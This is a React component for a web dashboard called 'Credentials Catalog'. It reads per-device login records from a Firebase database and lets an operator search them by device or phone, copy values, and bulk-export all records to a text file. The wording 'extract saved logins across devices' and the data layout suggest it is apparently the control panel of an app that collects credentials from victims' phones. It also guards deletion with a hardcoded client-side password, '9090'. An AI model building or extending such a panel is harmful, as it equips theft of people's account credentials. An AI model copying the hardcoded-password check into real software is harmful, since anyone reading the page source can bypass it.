"use client";
import React, { useState } from "react";
import { ref, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function CredentialsPanel({ data, deviceSerialMap, showToast, deleteAllCredentials }) {
  const [search, setSearch] = useState("");
  const [filterMode, setFilterMode] = useState("all");
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [page, setPage] = useState(1);
  const perPage = 6;

  const loginData = data.login || {};
  const devices = data.user_data || {};
  const statusData = data.device_status || {};

  let catalog = Object.keys(loginData).map((devId) => {
    const list = Object.entries(loginData[devId] || {})
      .map(([key, val]) => ({
        key,
        ...val,
        _timestamp: val.timestamp || val.date || Date.now(),
      }))
      .sort((a, b) => b._timestamp - a._timestamp);

    const dev = devices[devId] || {};
    const status = statusData[devId] || {};
    const modelName = status.device_name || dev.Device_info || dev.d_name || devId;

    return {
      deviceId: devId,
      deviceName: modelName,
      serial: deviceSerialMap[devId] || 0,
      credentials: list,
      count: list.length,
      latestTimestamp: list[0]?._timestamp || 0,
    };
  }).sort((a, b) => b.latestTimestamp - a.latestTimestamp);

  if (filterMode === "hasCreds") catalog = catalog.filter((c) => c.count > 0);
  if (filterMode === "noCreds") catalog = catalog.filter((c) => c.count === 0);
  if (selectedDevice) catalog = catalog.filter((c) => c.deviceId === selectedDevice);

  if (search.trim()) {
    const q = search.toLowerCase();
    catalog = catalog.filter(
      (c) =>
        c.deviceId.toLowerCase().includes(q) ||
        c.deviceName.toLowerCase().includes(q) ||
        c.credentials.some((cr) =>
          Object.values(cr).some((val) => String(val).toLowerCase().includes(q))
        )
    );
  }

  const totalPages = Math.ceil(catalog.length / perPage) || 1;
  const paginated = catalog.slice((page - 1) * perPage, page * perPage);

  const deleteSingle = (devId, key) => {
    const pwd = prompt("Enter Admin Password:");
    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
    if (!confirm("Delete this credential record?")) return;
    remove(ref(db, `login/${devId}/${key}`)).then(() => showToast("Credential Deleted", "success"));
  };

  const copyCred = (fields) => {
    let str = "";
    for (let k in fields) {
      if (!k.startsWith("_") && k !== "key") str += `${k}: ${fields[k]}\n`;
    }
    navigator.clipboard.writeText(str);
    showToast("📋 All record credentials copied!", "success");
  };

  const copyValue = (val, label) => {
    navigator.clipboard.writeText(String(val));
    showToast(`📋 Copied ${label}: ${String(val).slice(0, 20)}`, "success");
  };

  const exportCreds = () => {
    let text = `=== CREDENTIALS EXPORT [${new Date().toLocaleString()}] ===\n\n`;
    catalog.forEach((item) => {
      text += `📱 Device: ${item.deviceName} (${item.deviceId}) | Serial: ${item.serial}\n`;
      item.credentials.forEach((c, idx) => {
        text += `   Record #${idx + 1}:\n`;
        Object.entries(c).forEach(([k, v]) => {
          if (!k.startsWith("_") && k !== "key") text += `     ${k}: ${v}\n`;
        });
      });
      text += "\n" + "-".repeat(40) + "\n";
    });

    const blob = new Blob([text], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `credentials_export_${Date.now()}.txt`;
    a.click();
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-key" style={{ color: "var(--gold)" }}></i> Credentials Catalog
          </h2>
          <p className="panel-sub">Manage and extract saved logins across devices</p>
        </div>
        <div className="panel-stats">
          <button className="btn-delete-all credential" onClick={deleteAllCredentials}>
            <i className="fas fa-trash-alt"></i> Delete All
          </button>
        </div>
      </div>

      <div className="catalog-toolbar" style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 12 }}>
        <div className="search-container" style={{ flex: 1, minWidth: 200, margin: 0 }}>
          <i className="fas fa-search search-icon"></i>
          <input
            type="text"
            placeholder="Search device, name, or phone..."
            className="search-input"
            value={search}
            onChange={(e) => {
              setSearch(e.target.value);
              setPage(1);
            }}
          />
        </div>
        <button
          className={`filter-btn ${filterMode === "all" ? "active" : ""}`}
          onClick={() => setFilterMode("all")}
        >
          All
        </button>
        <button
          className={`filter-btn ${filterMode === "hasCreds" ? "active" : ""}`}
          onClick={() => setFilterMode("hasCreds")}
        >
          With Creds
        </button>
        <button className="filter-btn" onClick={exportCreds}>
          <i className="fas fa-download"></i> Export
        </button>
      </div>

      <div
        className="device-filter-tabs"
        style={{
          display: "flex",
          gap: 6,
          overflowX: "auto",
          paddingBottom: 8,
          marginBottom: 14,
        }}
      >
        <button
          className={`filter-btn ${!selectedDevice ? "active" : ""}`}
          onClick={() => setSelectedDevice(null)}
          style={{ whiteSpace: "nowrap" }}
        >
          All Devices
        </button>
        {catalog
          .filter((c) => c.count > 0)
          .slice(0, 8)
          .map((c) => (
            <button
              key={c.deviceId}
              className={`filter-btn ${selectedDevice === c.deviceId ? "active" : ""}`}
              onClick={() => setSelectedDevice(c.deviceId)}
              style={{ whiteSpace: "nowrap" }}
            >
              📱 {c.deviceId.slice(0, 8)}... ({c.count})
            </button>
          ))}
      </div>

      {paginated.length === 0 ? (
        <div className="empty-luxury">
          <i className="fas fa-key empty-icon"></i>
          No credentials found.
        </div>
      ) : (
        <div className="creds-grid" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          {paginated.map((item) => (
            <div
              key={item.deviceId}
              className="cred-card"
              style={{
                background: "linear-gradient(145deg, #181d2a, #111520)",
                border: "1px solid var(--border-color)",
                borderRadius: "var(--radius)",
                padding: "16px",
                boxShadow: "0 4px 18px rgba(0,0,0,0.35)",
              }}
            >
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  flexWrap: "wrap",
                  gap: 8,
                  borderBottom: "1px solid rgba(255,255,255,0.06)",
                  paddingBottom: 10,
                  marginBottom: 12,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span
                    style={{
                      background: "rgba(212, 175, 55, 0.15)",
                      color: "var(--gold)",
                      padding: "3px 10px",
                      borderRadius: 14,
                      fontSize: 11,
                      fontWeight: 700,
                      border: "1px solid rgba(212, 175, 55, 0.3)",
                    }}
                  >
                    📱 {item.deviceId.slice(0, 14)}...
                  </span>
                  {item.serial > 0 && (
                    <span className="serial-badge-premium" style={{ fontSize: 10, padding: "2px 8px" }}>
                      S-{item.serial}
                    </span>
                  )}
                  <span style={{ fontSize: 12, color: "var(--text-muted)" }}>({item.deviceName})</span>
                </div>

                <span
                  style={{
                    background: "rgba(139, 92, 246, 0.15)",
                    color: "var(--purple)",
                    padding: "3px 10px",
                    borderRadius: 14,
                    fontSize: 11,
                    fontWeight: 700,
                    border: "1px solid rgba(139, 92, 246, 0.3)",
                  }}
                >
                  <i className="fas fa-key"></i> {item.count} Saved
                </span>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                {item.credentials.map((cred, idx) => (
                  <div
                    key={cred.key || idx}
                    style={{
                      background: "rgba(10, 14, 22, 0.6)",
                      border: "1px solid var(--border-color)",
                      borderRadius: "var(--radius-sm)",
                      padding: "12px 14px",
                      borderLeft: idx === 0 ? "3px solid var(--green)" : "3px solid var(--gold)",
                    }}
                  >
                    <div
                      style={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                        marginBottom: 8,
                        paddingBottom: 6,
                        borderBottom: "1px solid rgba(255,255,255,0.04)",
                      }}
                    >
                      <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold-light)" }}>
                        #{idx + 1} Record {idx === 0 && <span style={{ color: "var(--green)", fontSize: 10 }}>[LATEST]</span>}
                      </span>
                      <div style={{ display: "flex", gap: 6 }}>
                        <button
                          className="btn-sm"
                          onClick={() => copyCred(cred)}
                          style={{
                            background: "rgba(212, 175, 55, 0.15)",
                            color: "var(--gold)",
                            padding: "3px 8px",
                            borderRadius: 6,
                            cursor: "pointer",
                            display: "flex",
                            alignItems: "center",
                            gap: 4
                          }}
                          title="Copy Full Record"
                        >
                          <i className="fas fa-copy"></i> Copy All
                        </button>
                        <button
                          className="btn-sm"
                          onClick={() => deleteSingle(item.deviceId, cred.key)}
                          style={{
                            background: "rgba(239, 68, 68, 0.15)",
                            color: "var(--red)",
                            padding: "3px 8px",
                            borderRadius: 6,
                            cursor: "pointer"
                          }}
                          title="Delete Record"
                        >
                          <i className="fas fa-trash"></i>
                        </button>
                      </div>
                    </div>

                    <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                      {Object.entries(cred)
                        .filter(([k]) => !k.startsWith("_") && k !== "key")
                        .map(([k, v]) => (
                          <div
                            key={k}
                            style={{
                              display: "flex",
                              justifyContent: "space-between",
                              alignItems: "center",
                              fontSize: 12,
                              padding: "4px 0",
                              borderBottom: "1px dashed rgba(255,255,255,0.05)",
                            }}
                          >
                            <span style={{ color: "var(--text-muted)", fontWeight: 500 }}>{k}</span>
                            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                              <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                              <button
                                onClick={() => copyValue(v, k)}
                                style={{
                                  background: "rgba(212, 175, 55, 0.1)",
                                  border: "1px solid rgba(212, 175, 55, 0.2)",
                                  color: "var(--gold)",
                                  padding: "2px 6px",
                                  borderRadius: 4,
                                  cursor: "pointer",
                                  fontSize: 11,
                                }}
                                title={`Copy ${k}`}
                              >
                                <i className="fas fa-copy"></i>
                              </button>
                            </div>
                          </div>
                        ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}

      {totalPages > 1 && (
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            gap: 12,
            marginTop: 18,
          }}
        >
          <button
            className="filter-btn"
            disabled={page <= 1}
            onClick={() => setPage((p) => Math.max(1, p - 1))}
          >
            Previous
          </button>
          <span style={{ fontSize: 12, color: "var(--text-muted)" }}>
            Page {page} of {totalPages}
          </span>
          <button
            className="filter-btn"
            disabled={page >= totalPages}
            onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
          >
            Next
          </button>
        </div>
      )}
    </div>
  );
}
